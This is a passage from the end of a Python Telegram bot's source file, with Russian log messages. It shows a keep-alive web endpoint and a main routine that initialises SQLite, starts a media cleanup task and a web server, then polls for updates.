        if "MESSAGE_ID_INVALID" not in str(e):
            logging.error(f"confirm edit fail: {e}")
    active_deals.pop(deal_id, None)


# ================= WEB + MAIN =================
async def handle(request):
    return web.Response(text="Bot is alive!")


async def main():
    init_db()
    os.makedirs(MEDIA_DIR, exist_ok=True)
    logging.info(f"[DB] SQLite инициализирован: {DB_PATH}")
    logging.info(f"[MEDIA] Папка для медиа: {MEDIA_DIR}")
    logging.info("[OWNER] OWNER_ID не используется — все команды для всех")

    asyncio.create_task(media_cleanup_worker())
    logging.info(
        f"[CLEANUP] Автоочистка media/: каждые "
        f"{MEDIA_CLEANUP_INTERVAL // 60} мин"
    )

    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()

    await bot.delete_webhook(drop_pending_updates=True)
    logging.info("[CLEANUP] Накопленные апдейты сброшены")

    await dp.start_polling(bot, drop_pending_updates=True)


if __name__ == "__main__":
    asyncio.run(main())